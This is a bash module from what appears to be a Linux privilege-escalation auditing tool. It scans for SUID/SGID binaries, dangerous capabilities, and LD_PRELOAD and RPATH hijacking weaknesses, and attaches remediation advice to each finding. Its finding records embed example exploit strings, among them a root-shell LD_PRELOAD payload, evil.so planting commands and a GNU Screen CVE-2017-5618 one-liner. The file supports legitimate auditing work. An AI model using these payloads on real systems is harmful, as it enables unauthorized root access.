#!/usr/bin/env bash
# modules/suid/suid_finder.sh - SUID/SGID binary analysis and GTFOBins matching

if ! declare -F capability_research_append &>/dev/null; then
    # shellcheck source=../kernel/kernel_research.sh
    [[ -n "${SCRIPT_DIR:-}" && -f "${SCRIPT_DIR}/modules/kernel/kernel_research.sh" ]] && source "${SCRIPT_DIR}/modules/kernel/kernel_research.sh"
fi

run_suid_enum() {
    [[ "${QUIET_MODE:-0}" == "0" ]] && print_section "SUID/SGID ANALYSIS"

    local start_ms
    start_ms=$(timestamp_ms)

    if [[ "${QUIET_MODE:-0}" == "0" ]]; then
        echo -e "  ${GREY}[i] GTFOBins (https://gtfobins.org/): SUID matches include example commands and extra techniques in report evidence.${RESET}"
    fi

    _find_suid_binaries
    _find_sgid_binaries
    _check_ld_preload
    _check_rpath_runpath

    log_timing "suid_enum" "$(elapsed_since "$start_ms")"
}

run_capabilities_enum() {
    [[ "${QUIET_MODE:-0}" == "0" ]] && print_section "LINUX CAPABILITIES"

    local start_ms
    start_ms=$(timestamp_ms)

    _check_interesting_capabilities

    log_timing "capabilities_enum" "$(elapsed_since "$start_ms")"
}

# ──────────────────────────────────────────────────────────────
# SUID binary scan
# ──────────────────────────────────────────────────────────────
_find_suid_binaries() {
    print_subsection "SUID Binaries"

    local suid_bins=()
    local find_output
    find_output=$(safe_run 60 find / \
        -not \( -path /proc -prune \) \
        -not \( -path /sys -prune \) \
        -not \( -path /dev -prune \) \
        -not \( -path /run -prune \) \
        -perm -4000 -type f 2>/dev/null | sort)

    if [[ -z "$find_output" ]]; then
        print_info "No SUID binaries found (or no permission to search)"
        return
    fi

    local count=0
    while IFS= read -r suid_bin; do
        [[ -z "$suid_bin" ]] && continue

        local bin_name
        bin_name=$(basename "$suid_bin")
        local owner
        owner=$(file_owner "$suid_bin")
        local perms
        perms=$(file_perms "$suid_bin")

        suid_bins+=("$suid_bin")

        # Filter standard system SUID binaries
        if _is_standard_suid "$bin_name"; then
            [[ "${VERBOSE_MODE:-0}" == "1" ]] && echo -e "  ${GREY}[std] ${suid_bin}${RESET}"
        else
            echo -e "  ${BOLD_YELLOW}[SUID]${RESET} ${suid_bin} ${GREY}(owner: ${owner}, perms: ${perms})${RESET}"
            add_finding "MEDIUM" "suid" "-" "Non-standard SUID binary: ${bin_name}" \
                "${suid_bin} (owner: ${owner}, perms: ${perms})" \
                "" \
                "Binary: ${suid_bin} (permissions: $(file_perms "${suid_bin}"), owner: $(file_owner "${suid_bin}"))" \
                "Remove SUID if not required: chmod u-s \"${suid_bin}\". Prefer file capabilities (setcap) or service accounts instead of broad SUID." \
                "https://attack.mitre.org/techniques/T1548/001/" \
                "T1548.001"
        fi

        # GTFOBins lookup
        local gtfo_result
        gtfo_result=$(gtfobins_lookup "$bin_name" "suid")

        if [[ -n "$gtfo_result" ]]; then
            local exploit_type exploit_cmd
            exploit_type=$(echo "$gtfo_result" | head -1 | cut -d'|' -f1)
            exploit_cmd=$(echo "$gtfo_result" | head -1 | cut -d'|' -f2)

            local sev="HIGH"
            [[ "$exploit_type" == "file-read" ]] && sev="MEDIUM"

            local gtfo_page ev_extra
            gtfo_page="$(gtfobins_binary_url "$bin_name")$(gtfobins_function_anchor "$exploit_type")"
            ev_extra="$(gtfobins_techniques_evidence "$bin_name" "suid" 6)"

            add_finding "$sev" "suid" "-" "GTFOBins SUID: ${bin_name} [${exploit_type}]" \
                "SUID '${bin_name}' matches GTFOBins (https://gtfobins.org/): documented shell/file helpers when the bit is set and privileges are not dropped." \
                "${exploit_cmd}" \
                "Binary: ${suid_bin} (permissions: $(file_perms "${suid_bin}"), owner: $(file_owner "${suid_bin}")) ; Primary GTFOBins function: ${exploit_type} ; Other techniques: ${ev_extra}" \
                "Remove SUID (chmod u-s) if not required; replace with sudoers rules, file capabilities, or a dedicated setuid wrapper. See GTFOBins for context-specific hardening." \
                "${gtfo_page} ; https://gtfobins.org/ ; https://attack.mitre.org/techniques/T1548/001/" \
                "T1548.001"

            print_finding "$sev" "GTFOBins: ${bin_name}" "${exploit_cmd}"
        fi

        # Custom SUID checks
        _custom_suid_check "$suid_bin" "$bin_name"

        count=$(( count + 1 ))
    done <<< "$find_output"

    echo -e "\n  ${GREY}Total SUID binaries found: ${count}${RESET}"
}

# ──────────────────────────────────────────────────────────────
# SGID binary scan
# ──────────────────────────────────────────────────────────────
_find_sgid_binaries() {
    print_subsection "SGID Binaries"

    local sgid_bins
    sgid_bins=$(safe_run 60 find / \
        -not \( -path /proc -prune \) \
        -not \( -path /sys -prune \) \
        -not \( -path /dev -prune \) \
        -perm -2000 -type f 2>/dev/null | sort)

    if [[ -z "$sgid_bins" ]]; then
        [[ "${VERBOSE_MODE:-0}" == "1" ]] && print_info "No interesting SGID binaries found"
        return
    fi

    local count=0
    while IFS= read -r sgid_bin; do
        [[ -z "$sgid_bin" ]] && continue

        local bin_name
        bin_name=$(basename "$sgid_bin")
        local group
        group=$(stat -c '%G' "$sgid_bin" 2>/dev/null || stat -f '%Sg' "$sgid_bin" 2>/dev/null)

        if _is_standard_sgid "$bin_name"; then
            [[ "${VERBOSE_MODE:-0}" == "1" ]] && echo -e "  ${GREY}[std] ${sgid_bin}${RESET}"
        else
            echo -e "  ${BOLD_YELLOW}[SGID]${RESET} ${sgid_bin} ${GREY}(group: ${group})${RESET}"
            add_finding "LOW" "suid" "-" "Non-standard SGID binary: ${bin_name}" \
                "${sgid_bin} (group: ${group})" "" \
                "Binary: ${sgid_bin} (permissions: $(file_perms "${sgid_bin}"), owner: $(file_owner "${sgid_bin}"), group: ${group})" \
                "Remove SGID if not required: chmod g-s \"${sgid_bin}\". Prefer group ACLs or dedicated setgid helpers with minimal scope." \
                "https://attack.mitre.org/techniques/T1548/001/" \
                "T1548.001"
        fi

        count=$(( count + 1 ))
    done <<< "$sgid_bins"

    [[ "${VERBOSE_MODE:-0}" == "1" ]] && echo -e "  ${GREY}Total SGID binaries found: ${count}${RESET}"
}

# ──────────────────────────────────────────────────────────────
# Linux capabilities check
# ──────────────────────────────────────────────────────────────
_check_interesting_capabilities() {
    print_subsection "Linux Capabilities"

    if ! cmd_exists getcap; then
        print_info "getcap not available"
        return
    fi

    local caps_output
    caps_output=$(safe_run 30 getcap -r / 2>/dev/null)

    [[ -z "$caps_output" ]] && { print_info "No capabilities found"; return; }

    declare -A dangerous_caps=(
        ["cap_setuid"]="CRITICAL - Can set UID to 0"
        ["cap_setgid"]="CRITICAL - Can set GID to 0"
        ["cap_sys_admin"]="CRITICAL - Near-root capabilities"
        ["cap_dac_read_search"]="HIGH - Bypass file read permissions"
        ["cap_dac_override"]="HIGH - Bypass file write permissions"
        ["cap_sys_ptrace"]="HIGH - Can ptrace any process"
        ["cap_sys_module"]="CRITICAL - Can load kernel modules"
        ["cap_net_admin"]="MEDIUM - Network configuration"
        ["cap_net_raw"]="MEDIUM - Raw socket access"
        ["cap_sys_rawio"]="HIGH - Raw I/O access"
        ["cap_chown"]="MEDIUM - Change file ownership"
        ["cap_fowner"]="MEDIUM - Bypass ownership checks"
        ["cap_kill"]="MEDIUM - Send signals to any process"
        ["cap_audit_write"]="LOW - Write audit log"
        ["cap_linux_immutable"]="MEDIUM - Set immutable attribute"
    )

    while IFS= read -r cap_line; do
        [[ -z "$cap_line" ]] && continue

        local cap_binary
        cap_binary=$(echo "$cap_line" | awk '{print $1}')
        local cap_values
        cap_values=$(echo "$cap_line" | awk '{print $2}')
        local bin_name
        bin_name=$(basename "$cap_binary")

        echo -e "  ${BOLD_CYAN}[CAP]${RESET} ${cap_binary}"
        echo -e "         ${GREY}Capabilities: ${cap_values}${RESET}"

        for cap in "${!dangerous_caps[@]}"; do
            if echo "${cap_values,,}" | grep -q "$cap"; then
                local desc="${dangerous_caps[$cap]}"
                local sev="HIGH"
                [[ "$desc" == CRITICAL* ]] && sev="CRITICAL"
                [[ "$desc" == MEDIUM* ]] && sev="MEDIUM"
                [[ "$desc" == LOW* ]] && sev="LOW"

                # GTFOBins lookup
                local gtfo_result
                gtfo_result=$(gtfobins_lookup "$bin_name" "capabilities")

                local exploit_cmd="-"
                local gtfo_ref="https://man7.org/linux/man-pages/man8/getcap.8.html https://attack.mitre.org/techniques/T1548/"
                local cap_gtfo_ev=""
                if [[ -n "$gtfo_result" ]]; then
                    exploit_cmd=$(echo "$gtfo_result" | head -1 | cut -d'|' -f2)
                    local et_cap page_cap
                    et_cap=$(echo "$gtfo_result" | head -1 | cut -d'|' -f1)
                    cap_gtfo_ev="$(gtfobins_techniques_evidence "$bin_name" "capabilities" 5)"
                    page_cap="$(gtfobins_binary_url "$bin_name")$(gtfobins_function_anchor "$et_cap")"
                    gtfo_ref="${page_cap} ; https://gtfobins.org/ ; ${gtfo_ref}"
                fi

                local cap_research=""
                cap_research=$(capability_research_append "$cap" 2>/dev/null || true)

                add_finding "$sev" "capabilities" "-" \
                    "Dangerous capability ${cap} on ${bin_name}" \
                    "${cap_binary} has ${cap}: ${desc}" \
                    "$exploit_cmd" \
                    "File: ${cap_binary}; capability: ${cap}; effective set: ${cap_values}${cap_gtfo_ev:+ ; GTFOBins techniques: ${cap_gtfo_ev}}${cap_research}" \
                    "Drop the capability: setcap -r \"${cap_binary}\" where safe, or upgrade/replace the package; restrict execute access to trusted users." \
                    "$gtfo_ref" \
                    "T1548"

                print_finding "$sev" "${cap} on ${bin_name}" "$desc"
            fi
        done

    done <<< "$caps_output"
}

# ──────────────────────────────────────────────────────────────
# LD_PRELOAD and library hijacking check
# ──────────────────────────────────────────────────────────────
_check_ld_preload() {
    print_subsection "Library Preload Checks"

    # /etc/ld.so.preload check
    if [[ -f /etc/ld.so.preload ]]; then
        if is_writable "/etc/ld.so.preload"; then
            add_finding "CRITICAL" "suid" "-" "Writable /etc/ld.so.preload" \
                "/etc/ld.so.preload is writable - can inject malicious library into every setuid process" \
                "echo '/tmp/evil.so' > /etc/ld.so.preload && compile_evil_so()" \
                "Path: /etc/ld.so.preload (writable by current user; permissions: $(file_perms /etc/ld.so.preload), owner: $(file_owner /etc/ld.so.preload))" \
                "chown root:root /etc/ld.so.preload && chmod 644 /etc/ld.so.preload; remove unauthorized library lines." \
                "https://attack.mitre.org/techniques/T1574/006/ https://man7.org/linux/man-pages/man8/ld.so.8.html" \
                "T1574.006"
        else
            print_info "/etc/ld.so.preload exists (not writable)"
            cat /etc/ld.so.preload 2>/dev/null | while read -r lib; do
                if [[ -f "$lib" ]] && is_writable "$lib"; then
                    add_finding "CRITICAL" "suid" "-" "Writable preloaded library: ${lib}" \
                        "Preloaded library ${lib} is writable - can be replaced for SUID exploitation" \
                        "Overwrite ${lib} with malicious shared library" \
                        "Library: ${lib}; permissions: $(file_perms "${lib}"); owner: $(file_owner "${lib}")" \
                        "chown root:root \"${lib}\" && chmod go-w \"${lib}\"; remove from /etc/ld.so.preload if not legitimate." \
                        "https://attack.mitre.org/techniques/T1574/006/" \
                        "T1574.006"
                fi
            done
        fi
    fi

    # /etc/ld.so.conf.d/ check
    if [[ -d /etc/ld.so.conf.d ]]; then
        while IFS= read -r conf_file; do
            if is_writable "$conf_file"; then
                add_finding "HIGH" "suid" "-" "Writable ld.so config: ${conf_file}" \
                    "Library search path config is writable - can add malicious library path" \
                    "echo '/tmp/evil-libs' >> ${conf_file} && ldconfig" \
                    "Config: ${conf_file}; permissions: $(file_perms "${conf_file}"); owner: $(file_owner "${conf_file}")" \
                    "chown root:root \"${conf_file}\" && chmod 644 \"${conf_file}\"; revert malicious path lines and run ldconfig." \
                    "https://attack.mitre.org/techniques/T1574/006/" \
                    "T1574.006"
            fi

            while IFS= read -r lib_path; do
                [[ -z "$lib_path" ]] && continue
                [[ "$lib_path" =~ ^# ]] && continue

                if [[ -d "$lib_path" ]] && is_writable "$lib_path"; then
                    add_finding "HIGH" "suid" "-" "Writable library directory: ${lib_path}" \
                        "Library directory in ld.so.conf is writable - can plant malicious libraries" \
                        "cp /tmp/libevil.so ${lib_path}/ && ldconfig" \
                        "Directory: ${lib_path}; permissions: $(file_perms "${lib_path}"); owner: $(file_owner "${lib_path}")" \
                        "Remove world-writable bits; ensure library dirs are root-owned; audit ld.so.conf.d for untrusted paths." \
                        "https://attack.mitre.org/techniques/T1574/006/" \
                        "T1574.006"
                fi
            done < "$conf_file"
        done < <(find /etc/ld.so.conf.d/ -type f 2>/dev/null)
    fi

    # Sudo LD_PRELOAD
    local sudo_l
    sudo_l=$(sudo -n -l 2>/dev/null)
    if echo "$sudo_l" | grep -qi "LD_PRELOAD"; then
        add_finding "CRITICAL" "suid" "-" "sudo allows LD_PRELOAD" \
            "sudo configuration allows LD_PRELOAD environment variable" \
            "cat > /tmp/evil.c << 'EOF'\n#include <stdlib.h>\nvoid __attribute__((constructor)) init() { setuid(0); system(\"/bin/bash -p\"); }\nEOF\ngcc -shared -fPIC /tmp/evil.c -o /tmp/evil.so\nsudo LD_PRELOAD=/tmp/evil.so /some/allowed/command" \
            "Evidence: sudo -l output shows LD_PRELOAD is not stripped from the environment for allowed commands." \
            "Add Defaults env_delete += \"LD_PRELOAD LD_LIBRARY_PATH\" in sudoers, or use secure Defaults from your distribution." \
            "https://attack.mitre.org/techniques/T1574/006/ https://www.sudo.ws/docs/man/sudoers.man/" \
            "T1574.006"
    fi
}

# ──────────────────────────────────────────────────────────────
# Custom SUID binary checks
# ──────────────────────────────────────────────────────────────
_custom_suid_check() {
    local binary="$1"
    local name="$2"

    case "$name" in
        "screen")
            # GNU Screen 4.5.0 CVE-2017-5618
            local screen_ver
            screen_ver=$(screen --version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+' | head -1)
            if [[ -n "$screen_ver" ]] && version_lte "$screen_ver" "4.5.0"; then
                add_finding "HIGH" "suid" "CVE-2017-5618" "GNU Screen ${screen_ver} SUID LPE" \
                    "screen 4.5.0 is vulnerable to privilege escalation via logfile" \
                    "screen -D -m -L ld.so.preload echo -ne '\\x0a/tmp/libhax.so'" \
                    "Binary: ${binary} (permissions: $(file_perms "${binary}"), owner: $(file_owner "${binary}")); detected version: ${screen_ver}" \
                    "Upgrade GNU Screen to a version newer than 4.5.0 using distribution packages." \
                    "https://nvd.nist.gov/vuln/detail/CVE-2017-5618 https://attack.mitre.org/techniques/T1548/001/" \
                    "T1548.001"
            fi
            ;;
        "exim4"|"exim")
            local exim_ver
            exim_ver=$(exim --version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+' | head -1)
            if [[ -n "$exim_ver" ]] && version_lt "$exim_ver" "4.92"; then
                add_finding "HIGH" "suid" "CVE-2019-10149" "Exim ${exim_ver} RCE/LPE" \
                    "Exim < 4.92 vulnerable to CVE-2019-10149 Return of the WIZard" \
                    "See: https://www.exim.org/static/doc/security/CVE-2019-10149.txt" \
                    "Binary: ${binary} (permissions: $(file_perms "${binary}"), owner: $(file_owner "${binary}")); detected version: ${exim_ver}" \
                    "Update Exim to 4.92 or later; follow Exim security advisory and vendor patches." \
                    "https://nvd.nist.gov/vuln/detail/CVE-2019-10149 https://www.exim.org/static/doc/security/CVE-2019-10149.txt https://attack.mitre.org/techniques/T1548/001/" \
                    "T1548.001"
            fi
            ;;
        "pkexec")
            # PwnKit check is handled in the kernel module
            ;;
        "newgrp"|"sg")
            print_info "newgrp/sg SUID - may allow group escalation"
            ;;
        "chsh"|"chfn")
            [[ "${VERBOSE_MODE:-0}" == "1" ]] && print_info "${name} SUID binary"
            ;;
    esac
}

# ──────────────────────────────────────────────────────────────
# Standard SUID binary list (to reduce false positives)
# ──────────────────────────────────────────────────────────────
# ──────────────────────────────────────────────────────────────
# RPATH/RUNPATH hijacking in SUID binaries
# ──────────────────────────────────────────────────────────────
_check_rpath_runpath() {
    print_subsection "RPATH/RUNPATH Hijacking"

    cmd_exists readelf || cmd_exists objdump || return

    local suid_bins
    suid_bins=$(safe_run 30 find /usr /bin /sbin -perm -4000 -type f 2>/dev/null | head -50)

    [[ -z "$suid_bins" ]] && return

    while IFS= read -r suid_bin; do
        [[ -z "$suid_bin" ]] && continue
        local rpath=""

        if cmd_exists readelf; then
            rpath=$(readelf -d "$suid_bin" 2>/dev/null | grep -iE "RPATH|RUNPATH" | grep -oE '/[^ ]+' | tr -d ']')
        elif cmd_exists objdump; then
            rpath=$(objdump -p "$suid_bin" 2>/dev/null | grep -iE "RPATH|RUNPATH" | awk '{print $2}')
        fi

        [[ -z "$rpath" ]] && continue

        IFS=: read -ra rpath_dirs <<< "$rpath"
        for rdir in "${rpath_dirs[@]}"; do
            if [[ -d "$rdir" ]] && is_writable "$rdir"; then
                add_finding "CRITICAL" "suid" "-" "SUID binary with writable RPATH: $(basename "$suid_bin")" \
                    "${suid_bin} has RPATH ${rdir} which is writable - library hijacking possible" \
                    "gcc -shared -fPIC -o ${rdir}/libevil.so evil.c && ${suid_bin}" \
                    "SUID binary: ${suid_bin} (permissions: $(file_perms "${suid_bin}"), owner: $(file_owner "${suid_bin}")); writable RPATH dir: ${rdir} (perms: $(file_perms "${rdir}"), owner: $(file_owner "${rdir}"))" \
                    "Rebuild without unsafe RPATH, or secure the directory: chown root:root \"${rdir}\" && chmod 755 \"${rdir}\"; remove attacker-controlled libraries." \
                    "https://attack.mitre.org/techniques/T1574/006/" \
                    "T1574.006"
            elif [[ ! -d "$rdir" ]]; then
                local parent_dir
                parent_dir=$(dirname "$rdir")
                if [[ -d "$parent_dir" ]] && is_writable "$parent_dir"; then
                    add_finding "HIGH" "suid" "-" "SUID binary RPATH dir missing: $(basename "$suid_bin")" \
                        "${suid_bin} references non-existent RPATH ${rdir} in writable parent" \
                        "mkdir -p ${rdir} && gcc -shared -fPIC -o ${rdir}/lib.so evil.c" \
                        "SUID binary: ${suid_bin}; missing RPATH target: ${rdir}; parent ${parent_dir} (permissions: $(file_perms "${parent_dir}"), owner: $(file_owner "${parent_dir}"))" \
                        "Rebuild with correct RPATH or supply a root-owned ${rdir}; fix writable parent so unprivileged users cannot create ${rdir}." \
                        "https://attack.mitre.org/techniques/T1574/006/" \
                        "T1574.006"
                fi
            fi
        done
    done <<< "$suid_bins"
}

_is_standard_suid() {
    local bin="$1"
    local standard_suid=(
        "sudo" "su" "passwd" "login" "mount" "umount"
        "ping" "ping6" "traceroute" "traceroute6"
        "chage" "chsh" "chfn" "gpasswd" "newgrp" "sg"
        "crontab" "at" "newuidmap" "newgidmap"
        "pkexec" "polkit" "fusermount" "fusermount3"
        "pppd" "postdrop" "postqueue"
        "ssh-agent" "Xorg" "Xwrapper" "xsession-errors"
        "staprun" "ksu"
        "dbus-daemon-launch-helper"
        "unix_chkpwd" "pt_chown"
    )

    for std in "${standard_suid[@]}"; do
        [[ "$bin" == "$std" ]] && return 0
    done
    return 1
}

_is_standard_sgid() {
    local bin="$1"
    local standard_sgid=(
        "wall" "write" "dotlockfile" "lockfile"
        "ssh-agent" "crontab"
        "bsd-write" "utempter"
        "screen" "expiry"
    )

    for std in "${standard_sgid[@]}"; do
        [[ "$bin" == "$std" ]] && return 0
    done
    return 1
}
